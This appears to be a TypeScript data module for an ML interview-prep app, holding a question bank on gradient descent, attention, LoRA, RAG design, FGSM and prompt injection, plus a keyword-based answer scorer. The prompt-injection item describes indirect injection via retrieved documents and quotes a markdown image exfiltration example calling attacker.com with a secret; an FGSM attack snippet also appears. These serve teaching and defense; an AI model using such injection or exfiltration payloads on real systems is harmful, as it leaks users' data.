export type ExperienceBracket = '0-1y' | '1-2y' | '2-4y' | '3-4y' | 'all';

export interface InterviewQuestion {
  id: string;
  title: string;
  experienceBracket: ExperienceBracket;
  experienceLabel: string;
  category: 'ML Mathematics & Theory' | 'Deep Learning & LLMs' | 'System Design & Architecture' | 'Coding & Data Structures' | 'Behavioral & Scenario' | 'Cybersecurity & AI Defense';
  difficulty: 'Easy' | 'Medium' | 'Hard';
  companyTags: string[];
  questionPrompt: string;
  keyConcepts: string[];
  mathematicalDerivation?: {
    formula: string;
    steps: string[];
  };
  modelAnswer: string;
  codeSnippet?: {
    language: string;
    code: string;
  };
  interviewerTips: string[];
  commonPitfalls: string[];
}

export interface MockInterviewResult {
  overallScore: number;
  technicalAccuracy: number;
  mathematicalDepth: number;
  systemDesignScore: number;
  communicationScore: number;
  strengths: string[];
  areasForImprovement: string[];
  suggestedAnswerReview: string;
}

const INTERVIEW_QUESTIONS_DATABASE: InterviewQuestion[] = [
  // ── TRACK 1: 0-1 YEARS EXPERIENCE (FRESHERS / ENTRY LEVEL) ──
  {
    id: 'int-q1-01',
    title: 'Explain Gradient Descent and Derive the Weight Update Step',
    experienceBracket: '0-1y',
    experienceLabel: '0-1 Years (Freshers & Entry Level)',
    category: 'ML Mathematics & Theory',
    difficulty: 'Easy',
    companyTags: ['Google', 'Amazon', 'Microsoft', 'Adobe'],
    questionPrompt:
      'Can you mathematically derive the gradient descent update rule for a linear regression model with Mean Squared Error (MSE)? What happens if the learning rate is too large or too small?',
    keyConcepts: ['Partial Derivatives', 'MSE Loss Formulation', 'Learning Rate Tuning', 'Convex Optimization'],
    mathematicalDerivation: {
      formula: 'θ_{t+1} = θ_t - η ⋅ ∇_θ L(θ_t)',
      steps: [
        '1. Define MSE Loss: L(w, b) = (1/2N) ∑_{i=1}^N (ŷ_i - y_i)^2 where ŷ_i = w x_i + b.',
        '2. Take partial derivative with respect to w: ∂L/∂w = (1/N) ∑_{i=1}^N (w x_i + b - y_i) ⋅ x_i = (1/N) X^T (ŷ - y).',
        '3. Update weight in opposite direction of gradient: w_{new} = w_{old} - η (∂L/∂w).'
      ]
    },
    modelAnswer:
      'Gradient descent is an iterative first-order optimization algorithm used to minimize a differentiable scalar loss function L(θ). By taking the partial derivative of the MSE loss with respect to the weight vector w, we determine the direction of steepest ascent. Multiplying by negative learning rate η updates the weights towards the global minimum. If η is too small, convergence is slow; if too large, the optimizer oscillates or diverges.',
    codeSnippet: {
      language: 'python',
      code: `import numpy as np

def gradient_descent(X, y, lr=0.01, epochs=1000):
    N, D = X.shape
    w = np.zeros(D)
    b = 0.0
    for _ in range(epochs):
        y_pred = np.dot(X, w) + b
        error = y_pred - y
        dw = (1/N) * np.dot(X.T, error)
        db = (1/N) * np.sum(error)
        w -= lr * dw
        b -= lr * db
    return w, b`
    },
    interviewerTips: [
      'Look for clear explanation of the negative sign (stepping opposite to gradient ascent).',
      'Candidate should mention learning rate schedules (e.g. cosine annealing or AdamW).'
    ],
    commonPitfalls: ['Forgetting to divide by N when averaging over batch samples.', 'Confusing batch GD, mini-batch GD, and stochastic GD (SGD).']
  },
  {
    id: 'int-q2-01',
    title: 'Bias-Variance Tradeoff and Regularization (L1 vs L2)',
    experienceBracket: '0-1y',
    experienceLabel: '0-1 Years (Freshers & Entry Level)',
    category: 'ML Mathematics & Theory',
    difficulty: 'Easy',
    companyTags: ['Meta', 'Uber', 'Salesforce'],
    questionPrompt:
      'Deconstruct the expected generalization error into Bias, Variance, and Irreducible Error. How do L1 (Lasso) and L2 (Ridge) penalties mathematically control this tradeoff?',
    keyConcepts: ['Expected Prediction Error Decomposition', 'L1 Sparsity (Lasso)', 'L2 Weight Shrinkage (Ridge)'],
    mathematicalDerivation: {
      formula: 'E[(y - ŷ)^2] = \\text{Bias}^2(ŷ) + \\text{Var}(ŷ) + σ^2',
      steps: [
        '1. Bias = E[ŷ] - y (systematic error from simplistic model assumptions).',
        '2. Variance = E[(ŷ - E[ŷ])^2] (sensitivity of model predictions to training data fluctuations).',
        '3. Ridge Loss: L_{Ridge} = L_0 + λ ∑ w_i^2. Lasso Loss: L_{Lasso} = L_0 + λ ∑ |w_i|.'
      ]
    },
    modelAnswer:
      'Total prediction error decomposes into Bias² (underfitting due to erroneous assumptions) + Variance (overfitting due to excessive sensitivity to noise) + Irreducible error σ². L2 regularization adds quadratic weight decay, shrinking weights smoothly toward zero without setting them to exact zero. L1 regularization uses absolute values whose diamond constraint contours produce sparse feature selection with exact zero weights.',
    interviewerTips: ['Ask candidate why L1 produces exact zeros (geometry of L1 ball corners vs L2 circle).'],
    commonPitfalls: ['Saying high bias causes overfitting (high bias causes underfitting).']
  },

  // ── TRACK 2: 1-2 YEARS EXPERIENCE (JUNIOR / APPLIED ML ENGINEERS) ──
  {
    id: 'int-q3-02',
    title: 'Derive Scaled Dot-Product Attention & Explain Why We Divide by √d_k',
    experienceBracket: '1-2y',
    experienceLabel: '1-2 Years (Applied ML Engineers)',
    category: 'Deep Learning & LLMs',
    difficulty: 'Medium',
    companyTags: ['OpenAI', 'Google', 'Anthropic', 'Microsoft', 'NVIDIA'],
    questionPrompt:
      'Walk me through the mathematics of Scaled Dot-Product Attention: Attention(Q, K, V) = softmax((QK^T)/√d_k)V. Why is the scaling factor 1/√d_k strictly necessary when d_k is large?',
    keyConcepts: ['Variance of Dot Products', 'Softmax Vanishing Gradients', 'Q, K, V Matrix Shapes'],
    mathematicalDerivation: {
      formula: '\\text{Attention}(Q, K, V) = \\text{softmax}\\left(\\frac{QK^T}{\\sqrt{d_k}}\\right) V',
      steps: [
        '1. Assume Q and K elements are independent random variables with mean 0 and variance 1.',
        '2. For single dot product q ⋅ k = ∑_{i=1}^{d_k} q_i k_i, the mean is 0 and variance is d_k.',
        '3. For large d_k (e.g. 128), values grow to ±30. Softmax becomes extremely peaky (one-hot), leading to vanishing gradients during backpropagation.',
        '4. Dividing by √d_k normalizes the variance back to 1.0, preserving healthy gradients.'
      ]
    },
    modelAnswer:
      'Under the assumption of zero-mean, unit-variance components, the dot product of two d_k-dimensional vectors has variance equal to d_k and standard deviation √d_k. Without scaling, large d_k pushes inputs into regions where the softmax function has near-zero derivatives (gradient saturation), killing backpropagation flow. Dividing by √d_k keeps logits in a balanced dynamic range.',
    codeSnippet: {
      language: 'python',
      code: `import torch
import math

def attention(q, k, v, mask=None):
    # q, k, v: [batch, heads, seq_len, d_k]
    d_k = q.size(-1)
    scores = torch.matmul(q, k.transpose(-2, -1)) / math.sqrt(d_k)
    if mask is not None:
        scores = scores.masked_fill(mask == 0, -1e9)
    weights = torch.softmax(scores, dim=-1)
    return torch.matmul(weights, v)`
    },
    interviewerTips: ['Check if candidate can compute variance of sum of independent products Var(∑ q_i k_i) = d_k.'],
    commonPitfalls: ['Saying √d_k is just a heuristic without knowing the variance proof.']
  },
  {
    id: 'int-q4-02',
    title: 'Parameter-Efficient Fine-Tuning: LoRA vs Full Fine-Tuning',
    experienceBracket: '1-2y',
    experienceLabel: '1-2 Years (Applied ML Engineers)',
    category: 'Deep Learning & LLMs',
    difficulty: 'Medium',
    companyTags: ['Meta', 'Hugging Face', 'Cohere', 'Databricks'],
    questionPrompt:
      'How does Low-Rank Adaptation (LoRA) work mathematically? Calculate parameter savings for a Linear layer of shape (4096, 4096) with rank r=8.',
    keyConcepts: ['Low-Rank Matrix Decomposition', 'Intrinsic Rank Hypothesis', 'GPU Memory Savings'],
    mathematicalDerivation: {
      formula: 'W = W_0 + \\Delta W = W_0 + \\frac{\\alpha}{r} (B \\cdot A)',
      steps: [
        '1. Original frozen weight W_0 has shape (d_out, d_in). Total params = d_out × d_in = 4096 × 4096 = 16,777,216.',
        '2. Decompose ΔW into B ∈ ℝ^{d_out × r} and A ∈ ℝ^{r × d_in} where r ≪ min(d_in, d_out).',
        '3. LoRA trainable params = (4096 × 8) + (8 × 4096) = 65,536 parameters.',
        '4. Parameter reduction: 65,536 / 16,777,216 ≈ 0.39% (a 256x parameter reduction!).'
      ]
    },
    modelAnswer:
      'LoRA freezes the pre-trained weight matrix W_0 and injects trainable rank decomposition matrices A and B. Forward pass computes h = W_0 x + (α/r) B(A x). Matrix A is initialized from Gaussian N(0, σ²) and B is initialized to 0, ensuring ΔW = 0 at the start of training. Because r=8 is tiny compared to 4096, we reduce optimizer memory states by >99% while achieving comparable task accuracy.',
    interviewerTips: ['Ask candidate why matrix B must be initialized to zero (so initial output equals base model).'],
    commonPitfalls: ['Forgetting that LoRA weights can be merged into W_0 at inference time with zero latency penalty.']
  },

  // ── TRACK 3: 3-4 YEARS EXPERIENCE (MID-SENIOR / ARCHITECTURE & LLMOPS) ──
  {
    id: 'int-q5-03',
    title: 'System Design: Multi-Tenant Enterprise RAG at 10,000 QPS',
    experienceBracket: '3-4y',
    experienceLabel: '3-4 Years (Senior / Systems Architect)',
    category: 'System Design & Architecture',
    difficulty: 'Hard',
    companyTags: ['OpenAI', 'Anthropic', 'Google Cloud', 'Uber', 'Databricks'],
    questionPrompt:
      'Design a production-grade, low-latency, multi-tenant Retrieval-Augmented Generation (RAG) system processing 10,000 queries/sec across 100M internal enterprise documents with strict role-based access control (RBAC).',
    keyConcepts: [
      'Hybrid Retrieval (Dense HNSW + BM25 Sparse)',
      'Cross-Encoder Reranking',
      'Tenant Namespace Sharding',
      'vLLM Continuous Batching',
      'Semantic Cache'
    ],
    modelAnswer:
      'Architecture comprises 5 core tiers:\n1. Ingestion Pipeline: Kafka queue → Document parsing/chunking (512 tokens with 10% overlap) → Metadata tagging (TenantId, ACL permissions, timestamp) → Text embedding via BGE-M3.\n2. Vector & Hybrid Store: Qdrant/Pinecone cluster partitioned by TenantId namespace. Hybrid search combines dense vector cosine distance with BM25 keyword index via Reciprocal Rank Fusion (RRF).\n3. Reranker & Guardrail: Top-100 candidates filtered by RBAC ACL, passed to Cohere/BGE cross-encoder to select top-5 most relevant passages.\n4. Caching: Redis semantic vector cache to instantly answer repeated queries in <5ms without LLM invocation.\n5. Inference: vLLM cluster with PagedAttention and continuous batching, streaming response tokens via Server-Sent Events (SSE).',
    interviewerTips: [
      'Probe on security/RBAC: How to prevent Tenant A from querying Tenant B embeddings.',
      'Probe on latency bottlenecks (Cross-encoder reranking vs LLM TTFT).'
    ],
    commonPitfalls: ['Ignoring document permission filtering before vector search (data privacy violation).']
  },
  {
    id: 'int-q6-03',
    title: 'KV-Cache Memory Footprint & PagedAttention Mechanics in vLLM',
    experienceBracket: '3-4y',
    experienceLabel: '3-4 Years (Senior / Systems Architect)',
    category: 'System Design & Architecture',
    difficulty: 'Hard',
    companyTags: ['NVIDIA', 'vLLM Core', 'Meta AI', 'Cerebras'],
    questionPrompt:
      'Calculate the exact KV-cache memory requirement for a Llama 3 70B model with context length 8,192 and batch size 32. How does PagedAttention solve memory fragmentation?',
    keyConcepts: ['KV-Cache Equation', 'PagedAttention Virtual Memory', 'Internal/External Fragmentation'],
    mathematicalDerivation: {
      formula: '\\text{Memory}_{KV} = 2 \\times N_{layers} \\times N_{kv\\_heads} \\times d_{head} \\times L_{ctx} \\times B \\times \\text{Bytes}',
      steps: [
        '1. Llama 3 70B params: N_{layers} = 80, d_{model} = 8192, N_{heads} = 64, N_{kv\\_heads} = 8 (Grouped Query Attention).',
        '2. Head dimension d_{head} = 8192 / 64 = 128.',
        '3. For Batch B = 32, Context L = 8192, FP16 (2 bytes):',
        '4. Memory = 2 × 80 × 8 × 128 × 8192 × 32 × 2 bytes = 85,899,345,920 bytes = 80 GB VRAM strictly for KV cache!'
      ]
    },
    modelAnswer:
      'In standard autoregressive generation, static pre-allocation of contiguous GPU memory for maximum sequence length causes 60-80% wasted memory due to internal fragmentation (memory reserved but unused) and external fragmentation. PagedAttention borrows virtual memory paging concepts from Operating Systems: it divides the KV cache into fixed-size physical blocks (e.g. 16 tokens per block) and maintains a block table, allowing non-contiguous GPU memory allocation and reducing memory waste to <4%.',
    interviewerTips: ['Check if candidate accounts for Grouped-Query Attention (n_kv_heads = 8 instead of 64).'],
    commonPitfalls: ['Using full n_heads instead of n_kv_heads in GQA models like Llama 3 / Mistral.']
  },

  // ── TRACK: CYBERSECURITY + AI MODELS & ADVERSARIAL DEFENSE ──
  {
    id: 'int-sec-01',
    title: 'Adversarial Attacks on Deep Learning: Fast Gradient Sign Method (FGSM)',
    experienceBracket: '1-2y',
    experienceLabel: '1-2 Years (Applied ML / Cyber AI)',
    category: 'Cybersecurity & AI Defense',
    difficulty: 'Medium',
    companyTags: ['CrowdStrike', 'Palo Alto Networks', 'Darktrace', 'Microsoft'],
    questionPrompt:
      'Mathematically derive the Fast Gradient Sign Method (FGSM) adversarial perturbation. How does adversarial training with robust optimization defend against norm-bounded perturbations ||δ||_∞ ≤ ε?',
    keyConcepts: ['Adversarial Perturbations', 'L_infinity Norm Constraint', 'Loss Surface Gradient Ascent', 'Adversarial Minimax Training'],
    mathematicalDerivation: {
      formula: 'x_{adv} = x + \\epsilon \\cdot \\text{sign}\\left(\\nabla_x \\mathcal{L}(\\theta, x, y)\\right)',
      steps: [
        '1. Objective: Maximize loss L(θ, x + δ, y) subject to ||δ||_∞ ≤ ε.',
        '2. First-order Taylor expansion around x: L(θ, x + δ, y) ≈ L(θ, x, y) + ∇_x L(θ, x, y)^T δ.',
        '3. To maximize ∇_x L^T δ under ||δ||_∞ ≤ ε, choose δ = ε ⋅ sign(∇_x L(θ, x, y)).',
        '4. Adversarial Defense formulation (Minimax robust optimization): min_θ E_{(x,y)} [ max_{||δ||_∞ ≤ ε} L(θ, x + δ, y) ].'
      ]
    },
    modelAnswer:
      'FGSM is a white-box gradient-based adversarial attack that adds an imperceptible perturbation in the direction of the sign of the input gradient. Under the L_infinity norm bound, setting δ = ε ⋅ sign(∇_x L) maximizes the first-order approximation of the loss, shifting intermediate layer activations across decision boundaries. Defense involves Adversarial Training (Madry Minimax objective), Defensive Distillation, and randomized smoothing.',
    codeSnippet: {
      language: 'python',
      code: `import torch

def fgsm_attack(image, epsilon, data_grad):
    # Collect the element-wise sign of the data gradient
    sign_data_grad = data_grad.sign()
    # Create the perturbed image by adjusting each pixel of the input image
    perturbed_image = image + epsilon * sign_data_grad
    # Adding clipping to maintain [0,1] range
    perturbed_image = torch.clamp(perturbed_image, 0, 1)
    return perturbed_image`
    },
    interviewerTips: ['Ask candidate why the sign() function is used under L_infinity constraint vs L_2 constraint.'],
    commonPitfalls: ['Confusing gradient with respect to weights ∇_θ L with gradient with respect to inputs ∇_x L.']
  },
  {
    id: 'int-sec-02',
    title: 'OWASP Top 10 for LLMs: Direct vs Indirect Prompt Injection & Guardrails',
    experienceBracket: '2-4y',
    experienceLabel: '2-4 Years (Security / LLM Architect)',
    category: 'Cybersecurity & AI Defense',
    difficulty: 'Hard',
    companyTags: ['Palo Alto Networks', 'OpenAI Security', 'Google Cloud', 'Cloudflare'],
    questionPrompt:
      'Explain the difference between Direct Prompt Injection (Jailbreaking) and Indirect Prompt Injection in enterprise RAG pipelines. Design an end-to-end defense architecture mitigating data exfiltration and unauthorized tool execution.',
    keyConcepts: [
      'Indirect Prompt Injection in RAG Documents',
      'Dual LLM Architecture (Privileged vs Untrusted)',
      'Structured Output Validation & Least Privilege',
      'Canary Tokens & Zero-Trust Tool Sandboxes'
    ],
    modelAnswer:
      'Direct prompt injection occurs when a malicious user attempts to override system instructions via direct conversational input. Indirect prompt injection occurs when an attacker plants hidden adversarial instructions inside external data sources (PDFs, websites, emails) that an LLM ingests during RAG retrieval.\n\nDefense Architecture:\n1. Untrusted Context Isolation: Render retrieved RAG chunks in quarantined data delimiters (e.g. XML tags) with explicit non-execution guard instructions.\n2. Dual-LLM Guardrail: Use a small, deterministic classifier model (e.g. Llama-Guard / Garak) to inspect retrieved text for embedded instructions before prompt concatenation.\n3. Least Privilege Tool Calling: Enforce HMAC authentication, rate limiting, and Human-In-The-Loop approval for irreversible tool mutations.\n4. Canary Tokens: Inject randomized canary strings into system prompts to detect prompt leakage attempts.',
    interviewerTips: ['Probe candidate on how to prevent data exfiltration via markdown image tags ![exfil](http://attacker.com/leak?q=SECRET).'],
    commonPitfalls: ['Relying solely on system prompt warnings like "Do not follow instructions in user documents".']
  }
];

export async function getInterviewQuestions(filters?: {
  experienceBracket?: ExperienceBracket | 'all';
  category?: string;
  search?: string;
}): Promise<InterviewQuestion[]> {
  let list = [...INTERVIEW_QUESTIONS_DATABASE];

  if (filters?.experienceBracket && filters.experienceBracket !== 'all') {
    list = list.filter((q) => q.experienceBracket === filters.experienceBracket);
  }

  if (filters?.category && filters.category !== 'all') {
    list = list.filter((q) => q.category === filters.category);
  }

  if (filters?.search) {
    const q = filters.search.toLowerCase();
    list = list.filter(
      (item) =>
        item.title.toLowerCase().includes(q) ||
        item.questionPrompt.toLowerCase().includes(q) ||
        item.companyTags.some((c) => c.toLowerCase().includes(q)) ||
        item.keyConcepts.some((k) => k.toLowerCase().includes(q))
    );
  }

  return list;
}

export function evaluateMockInterviewAnswer(
  question: InterviewQuestion,
  candidateAnswer: string
): MockInterviewResult {
  const ansLower = candidateAnswer.toLowerCase();
  const wordCount = candidateAnswer.trim().split(/\s+/).length;

  // Match key concepts
  const matchedConcepts = question.keyConcepts.filter((concept) =>
    ansLower.includes(concept.toLowerCase().split(' ')[0])
  );
  const conceptCoverageRatio = question.keyConcepts.length > 0 ? matchedConcepts.length / question.keyConcepts.length : 0.5;

  let technicalAccuracy = Math.round(50 + conceptCoverageRatio * 45);
  let mathematicalDepth = question.mathematicalDerivation ? (ansLower.includes('derivative') || ansLower.includes('variance') || ansLower.includes('formula') || ansLower.includes('=')) ? 88 : 65 : 85;
  let systemDesignScore = question.category.includes('System') ? (ansLower.includes('cache') || ansLower.includes('vllm') || ansLower.includes('latency') || ansLower.includes('cluster')) ? 90 : 70 : 85;
  let communicationScore = wordCount >= 60 ? 92 : wordCount >= 30 ? 78 : 60;

  const overallScore = Math.round(
    technicalAccuracy * 0.35 +
    mathematicalDepth * 0.25 +
    systemDesignScore * 0.2 +
    communicationScore * 0.2
  );

  const strengths: string[] = [];
  const areasForImprovement: string[] = [];

  if (matchedConcepts.length > 0) {
    strengths.push(`Addressed core industry concepts: ${matchedConcepts.join(', ')}.`);
  }
  if (wordCount >= 40) {
    strengths.push('Structured response with good technical narrative flow.');
  }

  if (matchedConcepts.length < question.keyConcepts.length) {
    const missing = question.keyConcepts.filter((c) => !matchedConcepts.includes(c));
    areasForImprovement.push(`Incorporate discussion on: ${missing.slice(0, 2).join(', ')}.`);
  }
  if (question.mathematicalDerivation && !ansLower.includes('=')) {
    areasForImprovement.push('State the exact governing mathematical equation to demonstrate rigorous engineering depth.');
  }

  return {
    overallScore,
    technicalAccuracy,
    mathematicalDepth,
    systemDesignScore,
    communicationScore,
    strengths: strengths.length > 0 ? strengths : ['Attempted response with baseline conceptual familiarity.'],
    areasForImprovement: areasForImprovement.length > 0 ? areasForImprovement : ['Excellent response! Practice timing yourself under 2 minutes.'],
    suggestedAnswerReview: question.modelAnswer,
  };
}
